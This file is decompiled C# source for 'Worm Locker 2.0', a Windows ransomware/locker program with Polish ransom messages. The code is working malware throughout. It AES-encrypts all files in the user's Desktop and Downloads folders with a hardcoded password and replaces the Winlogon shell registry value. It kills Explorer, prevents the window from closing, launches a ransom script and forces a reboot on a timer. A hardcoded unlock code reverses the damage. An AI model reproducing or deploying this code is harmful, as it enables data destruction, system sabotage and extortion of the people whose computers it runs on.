using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace WormLocker2._0;

public class WormLocker2 : Form
{
	public class CoreEncryption
	{
		public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class CoreDecryption
	{
		public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class EncryptionFile
	{
		public void EncryptFile(string file, string password)
		{
			byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, bytes);
			File.WriteAllBytes(file, bytes2);
		}
	}

	public class DecryptionFile
	{
		public void DecryptFile(string fileEncrypted, string password)
		{
			byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreDecryption.AES_Decrypt(bytesToBeDecrypted, bytes);
			File.WriteAllBytes(fileEncrypted, bytes2);
		}
	}

	private IContainer components = null;

	private Timer tmr_del_desktop;

	private Timer tmr_start_enc;

	private Timer tmr_unhide;

	private Timer tmr_out;

	private Label label1;

	private TextBox textBox1;

	private TextBox textBox2;

	private TextBox textBox3;

	private Label label2;

	[DllImport("user32.dll")]
	private static extern bool BlockInput(bool block);

	public WormLocker2()
	{
		InitializeComponent();
		((Control)label1).set_Text(TimeSpan.FromMinutes(120.0).ToString());
	}

	private void WormLocker2_Load(object sender, EventArgs e)
	{
		//IL_00b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00be: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		((Form)this).set_Location(new Point(-1000, -1000));
		RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
		registryKey.SetValue("Shell", "empty", RegistryValueKind.String);
		File.WriteAllText(folderPath + "\\worm_tool.sys", "encrypted");
		File.WriteAllText(text + "\\worm_tool.sys", "encrypted");
		tmr_del_desktop.Start();
		tmr_start_enc.Start();
		tmr_out.Start();
		DateTime startTime = DateTime.Now;
		Timer val = new Timer();
		val.set_Interval(1000);
		Timer val2 = val;
		val2.add_Tick((EventHandler)delegate
		{
			((Control)label1).set_Text((TimeSpan.FromMinutes(180.0) - (DateTime.Now - startTime)).ToString("hh\\:mm\\:ss"));
		});
		val2.set_Enabled(true);
		tmr_unhide.Start();
	}

	private void WormLocker2_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private static void Start_Encrypt()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		EncryptionFile encryptionFile = new EncryptionFile();
		string password = "21&37RDX";
		for (int i = 0; i < files.Length; i++)
		{
			encryptionFile.EncryptFile(files[i], password);
		}
		for (int j = 0; j < files2.Length; j++)
		{
			encryptionFile.EncryptFile(files2[j], password);
		}
	}

	private void tmr_del_desktop_Tick(object sender, EventArgs e)
	{
		tmr_del_desktop.Stop();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string path = folderPath + "\\desktop.ini";
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string path2 = text + "\\desktop.ini";
		if (File.Exists(path))
		{
			File.Delete(path);
		}
		if (File.Exists(path2))
		{
			File.Delete(path2);
		}
		tmr_del_desktop.Start();
	}

	private void tmr_start_enc_Tick(object sender, EventArgs e)
	{
		tmr_start_enc.Stop();
		Start_Encrypt();
	}

	private void tmr_unhide_Tick(object sender, EventArgs e)
	{
		tmr_unhide.Stop();
		Process[] array = null;
		array = Process.GetProcessesByName("explorer");
		Process[] array2 = array;
		foreach (Process process in array2)
		{
			process.Kill();
		}
		Process.Start("C:\\Windows\\System32\\ransom_voice.vbs");
		((Form)this).CenterToScreen();
		Thawouse();
	}

	public static void Thawouse()
	{
		BlockInput(block: false);
	}

	private void DECRYPT_Click(object sender, EventArgs e)
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_011e: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)textBox1).get_Text() == "")
		{
			MessageBox.Show("Zły kod:)", "Jeszcze 4 próby", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		else if (((Control)textBox1).get_Text() == "3GODZINY")
		{
			MessageBox.Show("The key is correct", "UNLOCKED", (MessageBoxButtons)0, (MessageBoxIcon)64);
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "", RegistryValueKind.String);
			File.Delete("C:\\Windows\\System32\\LogonUI.exe");
			File.Copy("C:\\Windows\\System32\\LogonUItrue.exe", "C:\\Windows\\System32\\LogonUI.exe");
			File.Delete("C:\\Windows\\System32\\LogonUItrue.exe");
			File.Delete("C:\\Windows\\System32\\LogonUIinf.exe");
			OFF_Encrypt();
			RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
			registryKey2.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
			Process.Start("C:\\Windows\\explorer.exe");
			Process[] array = null;
			array = Process.GetProcessesByName("WormLocker2.0");
			Process[] array2 = array;
			foreach (Process process in array2)
			{
				process.Kill();
			}
		}
		else
		{
			MessageBox.Show("Zły kod:)", "Jeszcze 4 próby", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	private static void OFF_Encrypt()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		DecryptionFile decryptionFile = new DecryptionFile();
		string password = "21&37RDX";
		for (int i = 0; i < files.Length; i++)
		{
			decryptionFile.DecryptFile(files[i], password);
		}
		for (int j = 0; j < files2.Length; j++)
		{
			decryptionFile.DecryptFile(files2[j], password);
			Thawouse();
		}
	}

	private void tmr_out_Tick(object sender, EventArgs e)
	{
		tmr_out.Stop();
		Process.Start("shutdown", "/r /t 0");
		Process[] array = null;
		array = Process.GetProcessesByName("wscript");
		Process[] array2 = array;
		foreach (Process process in array2)
		{
			process.Kill();
		}
		Process[] array3 = null;
		array3 = Process.GetProcessesByName("WormLocker2.0");
		Process[] array4 = array3;
		foreach (Process process2 in array4)
		{
			process2.Kill();
		}
	}

	private void label1_Click(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Expected O, but got Unknown
		//IL_0060: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Expected O, but got Unknown
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Expected O, but got Unknown
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_0080: Expected O, but got Unknown
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		//IL_008b: Expected O, but got Unknown
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0096: Expected O, but got Unknown
		//IL_028e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0298: Expected O, but got Unknown
		//IL_02c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_036e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0378: Expected O, but got Unknown
		//IL_03a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_041e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0428: Expected O, but got Unknown
		//IL_04ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_04fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0508: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(WormLocker2));
		tmr_del_desktop = new Timer(components);
		tmr_start_enc = new Timer(components);
		tmr_unhide = new Timer(components);
		tmr_out = new Timer(components);
		label1 = new Label();
		textBox1 = new TextBox();
		textBox2 = new TextBox();
		textBox3 = new TextBox();
		label2 = new Label();
		((Control)this).SuspendLayout();
		tmr_del_desktop.set_Enabled(true);
		tmr_del_desktop.add_Tick((EventHandler)tmr_del_desktop_Tick);
		tmr_start_enc.set_Enabled(true);
		tmr_start_enc.set_Interval(3000);
		tmr_start_enc.add_Tick((EventHandler)tmr_start_enc_Tick);
		tmr_unhide.set_Interval(10000);
		tmr_unhide.add_Tick((EventHandler)tmr_unhide_Tick);
		tmr_out.set_Enabled(true);
		tmr_out.set_Interval(7200000);
		tmr_out.add_Tick((EventHandler)tmr_out_Tick);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Location(new Point(321, 383));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(41, 20));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("virus");
		((Control)textBox1).set_Location(new Point(227, 383));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(76, 26));
		((Control)textBox1).set_TabIndex(1);
		((Control)textBox2).set_Location(new Point(227, 415));
		((Control)textBox2).set_Name("textBox2");
		((Control)textBox2).set_Size(new Size(215, 26));
		((Control)textBox2).set_TabIndex(2);
		((Control)textBox2).set_Text("HAHAHAHA TO NIE KONCIEC !!!");
		((Control)textBox3).set_BackColor(Color.FromArgb(35, 39, 42));
		((TextBoxBase)textBox3).set_BorderStyle((BorderStyle)0);
		((Control)textBox3).set_Font(new Font("Segoe UI", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox3).set_ForeColor(SystemColors.MenuBar);
		((Control)textBox3).set_Location(new Point(530, 115));
		((Control)textBox3).set_Margin(new Padding(4, 5, 4, 5));
		((TextBoxBase)textBox3).set_Multiline(true);
		((Control)textBox3).set_Name("textBox3");
		((TextBoxBase)textBox3).set_ReadOnly(true);
		textBox3.set_ScrollBars((ScrollBars)2);
		((Control)textBox3).set_Size(new Size(522, 478));
		((Control)textBox3).set_TabIndex(4);
		((Control)textBox3).set_TabStop(false);
		((Control)textBox3).set_Text(componentResourceManager.GetString("textBox3.Text"));
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(Color.Red);
		((Control)label2).set_Location(new Point(532, 55));
		((Control)label2).set_Margin(new Padding(4, 0, 4, 0));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(845, 55));
		((Control)label2).set_TabIndex(5);
		((Control)label2).set_Text("OH NIE ! Twój komputer ma virusa !. ;(");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(9f, 20f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		((Form)this).set_ClientSize(new Size(1396, 612));
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)textBox3);
		((Control)this).get_Controls().Add((Control)(object)textBox2);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).set_DoubleBuffered(true);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Margin(new Padding(4, 5, 4, 5));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("WormLocker2");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Worm Locker 2.0");
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(WormLocker2_FormClosing));
		((Form)this).add_Load((EventHandler)WormLocker2_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
